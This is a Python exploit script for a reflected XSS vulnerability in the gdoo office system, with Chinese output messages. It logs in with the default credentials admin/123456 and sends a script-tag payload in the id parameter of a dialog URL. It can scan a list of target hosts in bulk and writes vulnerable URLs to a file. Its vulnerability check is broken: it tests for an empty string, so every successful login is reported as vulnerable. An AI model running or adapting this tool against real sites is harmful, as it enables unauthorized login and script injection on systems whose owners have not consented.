import requests
import argparse
import urllib3
import sys
urllib3.disable_warnings()

def title():
    print("""
                                 gdoo反射型XSS漏洞
                            use: python3  gdoo_XSS.py
                                 Author: kento-sec
    """)

body = {'username': 'admin',
    'password': '123456',
    'captcha': ''
}


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        vuln_url = self.url + "/user/auth/login"
        poc_url = self.url + "/user/user/dialog?multi=0&id=\"><ScRiPt>alert(1)</sCrIpT>&iframe_id=project_project_index&dialog_index=0"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226",
        }
        try:
            res = requests.post(url=vuln_url, headers=headers,data=body,verify=False, timeout=5)
            if '\"success\":true' in res.text and res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {self.url} 登陆成功，检测是否存在XSS漏洞：\033[0m")
                poc = requests.get(url=poc_url, headers=headers, verify=False, timeout=5)
                if '' in poc.text and poc.status_code == 200:
                    print((f"\033[31m[!]  目标系统: {self.url} 存在gdoo存在反射型XSS漏洞！登陆默认口令之后poc：{poc_url}\033[0m"))
                    with open("gdoo_xss_vuln_result.txt", mode="a") as response:
                        response.write(self.url +" 登陆默认口令之后poc："+poc_url+ "\n")
            else:
                print(f"[!]  目标系统: {self.url} 登陆失败！")
        except Exception as e:
            print(f"[-]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip() # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="gdoo反射型XSS漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 gdoo_XSS.py -u http://127.0.0.1\neg2:>>>python3 gdoo_XSS.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

